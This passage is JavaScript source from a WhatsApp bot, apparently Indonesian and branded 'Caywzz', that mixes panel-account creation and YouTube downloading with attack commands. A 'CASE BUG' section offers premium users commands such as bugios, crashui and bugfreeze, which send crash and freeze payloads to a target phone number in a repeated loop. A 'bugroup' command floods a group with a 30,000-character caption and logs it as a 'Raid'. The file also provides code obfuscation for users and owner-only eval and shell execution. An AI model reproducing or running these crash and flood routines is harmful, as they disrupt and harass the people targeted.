}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${global.temppw.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.tempuser = null
global.temppw = null
}
break
case "cp1gbv3": case "cp2gbv3": case "cp3gbv3": case "cp4gbv3": case "cp5gbv3": case "cp6gbv3": case "cp7gbv3": case "cp8gbv3": case "cp9gbv3": case "cp10gbv3": case "cpunliv3": {
if (global.panel3 == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv3") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv3") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv3") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv3") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv3") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv3") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv3") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv3") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv3") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv3") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator) return reply("Khusus Owner")
let username = global.panel3[0].toLowerCase()
let email = username+"@Hutao.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await m.reply(`*Data Akun Sudah Dikirim Ke Nomor ${global.panel3[1].split('@')[0]}`)
var teks = `${monospace('Chat Privat data Panel')}

 ╭─ 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 」
 │• 🖥 _ID SERVER_ : ${server.id} 
 │• 💾 _RAM_ : ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
 │• 📈 _CPU_ : ${cpu == "0" ? "Unlimited" : cpu+"%"}
 │• 📡 _STORAGE_ : ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
 │• 🗒️ _CREATED_ : ${desc}
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(global.temppw.toString())}
 │• 🔗 _LOGIN_ : ${global.domain}
 ╰────`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await cay.relayMessage(global.panel3[1], msgii.message, { 
messageId: msgii.key.id 
})
global.panel3 = null
}
break
// CASE BUG
      case 'xcios': {
  try {
    if (!isPremium) return reply(`*khusus prem*`);
    
    let audioFile = './media/music.mp3'; // Ganti sesuai lokasi file audio
    let nomor = text.split(",")[0].trim(); // Menghapus spasi yang tidak diperlukan
    let jumlah = parseInt(text.split(",")[1]); // Mengonversi jumlah ke integer

    if (!jumlah) {
      return reply(`Gunakan ${prefix + command} nomor\nContoh: ${prefix + command} 62xxxxxxxxxx,5`);
    }

    await cay.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    const msgii = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: "Caywzz V2.1\n> © Caywzz"
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [
                  {
                    body: proto.Message.InteractiveMessage.Body.fromObject({}),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({}),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `
⟣──────────
𝙨𝙚𝙡𝙚𝙘𝙩 𝙩𝙝𝙚 𝙗𝙪𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙
@${nomor}
⟣────────
©𝘊𝘰𝘱𝘺𝘳𝘪𝘨𝘩𝘵 2024
                      `,
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/1w03u4.jpg'} }, { upload: cay.waUploadToServer }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [
                        {
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Bug!", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By Cay\", "rows": [{ "header": "BugCaywzz", "title": " B U G I O S G A B U N G A N", "id": ".bugios ${nomor},${jumlah}" }, 
{ "header": "BugIosCall", "title": " B U G I O S C A L L", "id": ".bugioscall ${nomor},${jumlah}" }, 
{ "header": "BugIosPay", "title": "B U G I O S P A Y", "id": ".bugiospay ${nomor},${jumlah}" }]}]}`
},
                        {
                          "name": "cta_url",
                          "buttonParamsJson": `{\"display_text\":\"Group Telegram\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://t.me/caywzzneh\"}`
                        }
                      ]
                    })
                  }
                ]
              })
            })
          }
        }
      },
      { userJid: m.sender, quoted: fkontak }
    );

    await cay.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    await cay.sendMessage(m.chat, {
      audio: { url: audioFile },
      mimetype: 'audio/mpeg'
    }, { quoted: msgii });
    /*await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`*</> Berhasil mengirimkan bug *${command}* dengan jumlah *${jumlah}*`);*/
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    reply("Maaf, terjadi kesalahan saat menjalankan perintah.");
  }
}
		break
		case 'xc': {
  try {
    if (!isPremium) return reply(`*khusus prem*`);
    
    let audioFile = './media/music.mp3'; // Ganti sesuai lokasi file audio
    let nomor = text.split(",")[0].trim(); // Menghapus spasi yang tidak diperlukan
    let jumlah = parseInt(text.split(",")[1]); // Mengonversi jumlah ke integer

    if (!jumlah) {
      return reply(`Gunakan ${prefix + command} nomor\nContoh: ${prefix + command} 62xxxxxxxxxx,5`);
    }

    await cay.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    const msgii = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: "Caywzz V2.1\n> © Caywzz"
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [
                  {
                    body: proto.Message.InteractiveMessage.Body.fromObject({}),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({}),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `
⟣──────────
𝙨𝙚𝙡𝙚𝙘𝙩 𝙩𝙝𝙚 𝙗𝙪𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙
@${nomor}
⟣────────
©𝘊𝘰𝘱𝘺𝘳𝘪𝘨𝘩𝘵 2024
                      `,
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/1w03u4.jpg'} }, { upload: cay.waUploadToServer }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [
                        {
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Bug!", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By Cay\", "rows": [{ "header": "BugCaywzz", "title": "B U G C A Y W Z Z", "id": ".bugcaywzz ${nomor},${jumlah}" }, 
{ "header": "BugUi", "title": "C R A S H U I", "id": ".bugui ${nomor},${jumlah}" }, 
{ "header": "BugUi", "title": "B U G F R E E Z E", "id": ".bugfreeze ${nomor},${jumlah}" }, 
{ "header": "BugBlank", "title": "  B U G B L A N K ", "id": ".bugblank ${nomor},${jumlah}" }, 
{ "header": "BugLocation", "title": "  B U G L O C A T I O N ", "id": ".buglocation ${nomor},${jumlah}" }]}]}`
},
                        {
                          "name": "cta_url",
                          "buttonParamsJson": `{\"display_text\":\"Group Telegram\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://t.me/caywzzneh\"}`
                        }
                      ]
                    })
                  }
                ]
              })
            })
          }
        }
      },
      { userJid: m.sender, quoted: fkontak }
    );

    await cay.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    await cay.sendMessage(m.chat, {
      audio: { url: audioFile },
      mimetype: 'audio/mpeg'
    }, { quoted: msgii });
    /*await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`*</> Berhasil mengirimkan bug *${command}* dengan jumlah *${jumlah}*`);*/
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    reply("Maaf, terjadi kesalahan saat menjalankan perintah.");
  }
}
		break
		 case 'bugfreeze': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
         await BlankScreen(nomor, ptcp = true),
         await bak2(nomor, ptcp = true),
         await BugLoca1(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
       case 'buglocation': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
        await locasifreeze2(nomor, ptcp = true),
         await BugLoca1(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
       case 'bugcaywzz': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
         await BlankScreen(nomor, ptcp = true),
         await bak2(nomor, ptcp = true),
         await BugLoca1(nomor, ptcp = true),
         await GlX(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
case 'crashui': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
         await crashui2(nomor, ptcp = true),
          await systemUi(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
       case 'bugios': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
         await Jade(nomor, ptcp = true),
          await TxIos(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
        case 'bugioscall': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
          await TxIos(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
        case 'bugiospay': {
        if (!isPremium) return reply(`*Khusus Premium*`);
        let nomor = text.split(",")[0].trim() + '@s.whatsapp.net';  // Menghapus spasi yang tidak diperlukan
        let jumlah = parseInt(text.split(",")[1]);  // Mengonversi jumlah ke integer
        if (!jumlah) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx,5`);
        for (let i = 0; i < jumlah; i++) {
         await Jade(nomor, ptcp = true),
          await TxIos(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
       case 'bugroup': {
	if (!isPremium) return reply(` Khusus Prem `)
	async function xd(nomor, chat, participant) {
cay.sendMessage(
chat,
{
audio: { url: "./media/hutaomenu.mp3" },
mimetype: `audio/mp4`,
caption: "㌷" + "ꦾ".repeat(30000)
},
{ quoted: { ...nullgb, key: { ...nullgb.key, participant } } }
);
}
async function DZXinX9() {
if (!args[0]) amount = `99`;
for (let i = 1; i < 10; i++) {
xd(pushname, m.chat, m.sender);

}
}
	await DZXinX9();
}
              console.log(chalk.green("Group Attack Sent | Raid By Caywzz"));
break
// Case Owner
case 'addprem':
if (!isCreator) return m.reply("*Khusus Owner*")
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await cay.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./geforceset/require/premium.json', JSON.stringify(premium))
m.reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isCreator) return m.reply("*Khusus Owner*")
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./geforceset/require/premium.json', JSON.stringify(premium))
m.reply(`The Number ${ya} Has Been Removed Premium!`)
break
case 'msgx': {
    // Pastikan hanya owner yang dapat menggunakan perintah ini
    if (!isPremium) return reply("Khusus Premium!");

    // Pastikan perintah dijalankan dengan reply
    if (!m.quoted) return reply("Silakan reply pesan yg mau di ambil jsonnya");

    // Ambil JSON dari pesan yang di-reply
    const quotedJson = JSON.stringify(m.quoted, null, 2);

    // Kirimkan JSON ke owner sebagai teks
    reply(`Nih dari pesan yang lu reply:\n\`\`\`${quotedJson}\`\`\``);

    break;
}
case 'dec': {
        const { webcrack } = await import('webcrack');
        const usage = `Contoh:
${prefix + command} (Input text or reply text to enc code)
${prefix + command} doc (Reply to a document)`;

        // Pengecekan khusus owner
        if (!isPremium) return reply('*Ngapain Bang:V*');

        let text;
        if (args.length >= 1) {
          text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
          text = m.quoted.text;
        } else {
          return reply(usage);
        }

        try {
          let message;
          if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
              docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
          } else {
            message = await webcrack(text);
          }

          // Simpan hasil ke dalam file @hwuwhw99decrypt.js
          const filePath = './@caywzzdecrypt.js';
          fs.writeFileSync(filePath, message.code);

          // Kirim file nero.txt
          await cay.sendMessage(m.chat, { document: { url: filePath }, mimetype: 'application/javascript', fileName: 'Decrypt By @caywzz.js' }, { quoted: m });

        } catch (error) {
          const errorMessage = `Terjadi kesalahan: ${error.message}`;
          await reply(errorMessage);
        }
      }
        break
				//tool encrypt
  case 'enc': case 'encrypt': {
            if (!isPremium) return reply("*Khusus Premium*")
        if (!m.quoted) return reply("dengan reply file .js")
        if (mime !== "application/javascript") return reply("dengan reply file .js")
        let media = await m.quoted.download()
        let filename = m.quoted.fileName
        await fs.writeFileSync(`./@enc${filename}.js`, media)
        await reply("Memproses encrypt code . . .")
        await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
          target: "node",
          preset: "high",
          compact: true,
          minify: true,
          flatten: true,

          identifierGenerator: function () {
            const originalString =
              "/*t.me/caywzzneh/*^/*($break)*/" +
              "/*.tme/caywzzneh/*^/*($break)*/";

            function hapusKarakterTidakDiinginkan(input) {
              return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
              );
            }

            function stringAcak(panjang) {
              let hasil = '';
              const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
              const panjangKarakter = karakter.length;

              for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                  Math.floor(Math.random() * panjangKarakter)
                );
              }
              return hasil;
            }

            return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
          },

          renameVariables: true,
          renameGlobals: true,

          // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
          stringEncoding: 0.01,
          stringSplitting: 0.1,
          stringConcealing: true,
          stringCompression: true,
          duplicateLiteralsRemoval: true, // Diaktifkan untuk mengurangi pengulangan literal

          shuffle: {
            hash: false,
            true: false
          },

          stack: false,
          controlFlowFlattening: false, // Nonaktifkan untuk mengurangi ukuran
          opaquePredicates: false, // Nonaktifkan untuk mengurangi ukuran
          deadCode: false, // Nonaktifkan untuk mengurangi ukuran
          dispatcher: false,
          rgf: false,
          calculator: false,
          hexadecimalNumbers: false,
          movedDeclarations: true,
          objectExtraction: true,
          globalConcealing: true
        }).then(async (obfuscated) => {
          await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
          await cay.sendMessage(m.chat, { document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅" }, { quoted: m })
        }).catch(e => reply("Error :" + e))
      }
        break
case "public": case "publik": {
if (!isCreator) return reply("Khusus Owner")
cay.public = true
reply("berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {
if (!isCreator) return reply("Khusus Owner")
cay.public = false
reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
//Ai Case
case 'ytmp3': {
    if (!text) return m.reply("Linknya?");
    await cay.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
    try {
        let { data } = await axios.get(`https://api.neekoi.me/api/youtube-audio?url=${args[0]}`);
        await cay.sendMessage(from, {
            audio: { url: data.audio },
            mimetype: 'audio/mpeg',
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 10,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: data.title,
                    body: `Upload: ${data.upload}`,
                    thumbnailUrl: data.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    mediaUrl: text,
                    sourceUrl: text,
                },
            },
        }, { quoted: fkontak });
    } catch (error) {
        m.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error);
    }
    await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
}
break;

case 'ytmp4': {
    if (!text) return m.reply("Linknya?");
    await cay.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
    try {
        let { data } = await axios.get(`https://api.neekoi.me/api/youtube-video?url=${args[0]}`);
        await cay.sendMessage(from, {
            video: { url: data.video },
            mimetype: 'video/mp4',
            fileName: data.title
        }, { quoted: fkontak });
    } catch (error) {
        m.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error);
    }
    await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
}
break;
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})

